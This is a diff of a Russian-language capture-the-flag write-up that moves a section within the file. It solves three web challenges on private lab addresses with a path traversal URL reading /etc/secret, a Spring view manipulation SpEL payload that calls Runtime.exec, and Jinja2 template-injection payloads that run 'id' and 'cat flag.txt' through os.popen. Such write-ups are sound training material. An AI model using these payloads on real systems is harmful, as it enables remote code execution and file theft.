@@ -5,6 +5,15 @@ web 1
 2. Чтобы скачать необходимый файл с сервера, воспользуемся уязвимостью "file inclusion". Введем в адресную строку: http://192.168.12.10:5001/download?file_type=/../../../../../../etc/secret. Скачивается нужный файл: ![Screenshot_2024-03-21_11_54_12](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/272ec935-ed57-40d3-9ebd-f3f918f99443)
 В нем находится флаг: ![Screenshot_2024-03-21_11_55_59](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/40f75ce4-6e24-4d2c-989d-bb41cd7e3b82)
 
+------------------------------------------------------
+web2
+
+Используем Spring view manipulation(https://lohitaksh-nandan.gitbook.io/cheat-sheets/framework/spring/view-manipulation)
+
+Введем команду http://192.168.12.13:8090/login?password=__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22password%22).getInputStream()).next()}__::.x
+
+Перезаходим на http://192.168.12.13:8090/login?password=password и вводим в поле пароля password 
+Получаем флаг. Профит
 
 
 
@@ -35,12 +44,3 @@ web3
 8. Проверим, выведет ли сервер ID файлов, которые хранятся на нем. Откроем документацию на GitHub (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2) и найдем следующий пункт "Exploit the SSTI by calling os.popen().read()". Вместо "{{2*22}}" введем "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}". Получаем:![Screenshot_2024-03-21_10_42_32](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/2b99527f-7580-4f0f-b02b-af9f7116badf) Сервер выдал ID файлов.
 
 9. Если сервер вывел ID файлов, то он может вывести и содержимое файлов. Нам необходимо найти флаг, поэтому введем команду: http://192.168.12.11:8001//flag?name={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read()%20}}; и получим флаг: ![Screenshot_2024-03-21_10_45_13](https://github.com/KaaaoooK/KaaaoooK/assets/164244108/909398a7-b9c5-4673-8a77-6948c6060872)
- 
-web2
-
-Используем Spring view manipulation(https://lohitaksh-nandan.gitbook.io/cheat-sheets/framework/spring/view-manipulation)
-
-Введем команду http://192.168.12.13:8090/login?password=__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22password%22).getInputStream()).next()}__::.x
-
-Перезаходим на http://192.168.12.13:8090/login?password=password и вводим в поле пароля password 
-Получаем флаг. Профит
